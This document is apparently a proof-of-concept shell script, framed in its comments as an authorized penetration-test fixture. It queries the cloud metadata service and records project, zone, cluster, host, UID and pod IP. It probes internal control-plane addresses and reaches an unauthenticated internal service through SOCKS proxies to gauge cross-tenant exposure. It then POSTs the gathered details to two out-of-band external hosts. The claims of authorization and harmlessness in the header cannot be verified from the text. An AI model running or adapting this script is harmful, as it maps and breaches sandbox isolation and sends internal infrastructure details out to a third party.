#!/bin/sh
# AUTHORIZED TRACE PENETRATION TEST ARTIFACT - marker: pt-detail-poc (candidate H-15).
# This repository is a Trace-owned test fixture. This script performs a bounded
# reachability measurement and reports ONLY: DNS resolution results, TCP/HTTP
# status codes, content-type and content-length. It never reads, stores or
# transmits any response body, so no tenant data can be captured by it.
# It makes ~12 connections total. It is not a scan and not a sweep.
OOB_A="https://453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com/pt-detail-poc/h15"
OOB_B="https://12524648b5677a7ef79ebafaa87c107cb9c4ae21.oob.rmrflabs.com/pt-detail-poc/h15"
HOOK="${TRACE_POC_HOOK:-unknown}"
OUT=/tmp/pt-detail-poc-h15.txt
M="Metadata-Flavor: Google"
MD="http://169.254.169.254/computeMetadata/v1"

st()   { curl -s -m 6 -o /dev/null -w '%{http_code}' "$1" 2>/dev/null || echo 000; }
sock() { curl -s -m 10 -o /dev/null -w '%{http_code}/%{content_type}/%{size_download}' --socks5-hostname "$1" "$2" 2>/dev/null || echo 000; }
tcp()  { (timeout 5 sh -c "echo > /dev/tcp/$1/$2") >/dev/null 2>&1 && echo open || echo closed; }
res()  { getent hosts "$1" 2>/dev/null | head -1 | awk '{print $1}' || true; }

PROJ=$(curl -s -m 3 -H "$M" "$MD/project/project-id" 2>/dev/null)
ZONE=$(curl -s -m 3 -H "$M" "$MD/instance/zone" 2>/dev/null | awk -F/ '{print $NF}')
CLUS=$(curl -s -m 3 -H "$M" "$MD/instance/attributes/cluster-name" 2>/dev/null)
MYIP=$( (ip -o -4 addr show 2>/dev/null || ifconfig -a 2>/dev/null) | grep -oE '10\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
DVM="sandbox-direct-tailnet-access"

{
printf 'marker: pt-detail-poc\nprobe: h15-v3\nhook: %s\nhost: %s\nuid: %s\npodip: %s\nproject: %s\nzone: %s\ncluster: %s\n' \
  "$HOOK" "$(hostname 2>/dev/null)" "$(id -u 2>/dev/null)" "$MYIP" "$PROJ" "$ZONE" "$CLUS"

# A. does the guest have ordinary internet egress at all (control)
printf 'A_internet_example: %s\n' "$(st https://example.com/)"

# B. the sandbox control plane ILB, from the committed saas-gcp-prod stack config
printf 'B_cp_ilb_80: %s\nB_cp_ilb_3210: %s\n' "$(st http://10.128.0.22/)" "$(tcp 10.128.0.22 3210)"

# C. cross-cluster ClusterIP/DNS gap: expected to fail from an execution cluster
printf 'C_clusterip_dns: %s\nC_clusterip_socks: %s\n' \
  "$(res sandbox-tailnet-access.tailscale.svc.cluster.local || echo none)" \
  "$(sock sandbox-tailnet-access.tailscale.svc.cluster.local:1055 http://investigate.lonk-forel.ts.net/healthz)"

# D. the direct tailnet-access VM via GCE internal DNS (firewall admits 10.36/14 only)
for N in "$DVM.$ZONE.c.$PROJ.internal" "$DVM.c.$PROJ.internal" "$DVM"; do
  IP=$(res "$N")
  printf 'D_vm[%s] dns=%s socks1055=%s health9002=%s\n' \
    "$N" "${IP:-none}" "$(tcp ${IP:-127.0.0.2} 1055)" "$(st http://$N:9002/healthz)"
done

# E. through any reachable SOCKS proxy to the unauthenticated investigate service.
#    /healthz proves reachability; /v1/investigate/repos is requested for STATUS AND
#    LENGTH ONLY so cross-tenant exposure can be sized without retrieving anyone's data.
for P in "$DVM.$ZONE.c.$PROJ.internal:1055" "$DVM:1055"; do
  printf 'E_socks[%s] healthz=%s repos=%s\n' "$P" \
    "$(sock $P http://investigate.lonk-forel.ts.net/healthz)" \
    "$(sock $P http://investigate.lonk-forel.ts.net/v1/investigate/repos)"
done

# F. direct, no proxy (expected to fail; confirms the proxy is what grants reach)
printf 'F_direct_investigate: %s\n' "$(st http://investigate.lonk-forel.ts.net/healthz)"
printf 'note: status codes, content-type and content-length only; no response body was read\n'
} > "$OUT" 2>&1

cat "$OUT"
cp "$OUT" ./TRACE_PROBE_RESULT.txt 2>/dev/null
curl -s -m 20 -X POST "$OOB_A" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
curl -s -m 20 -X POST "$OOB_B" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
exit 0
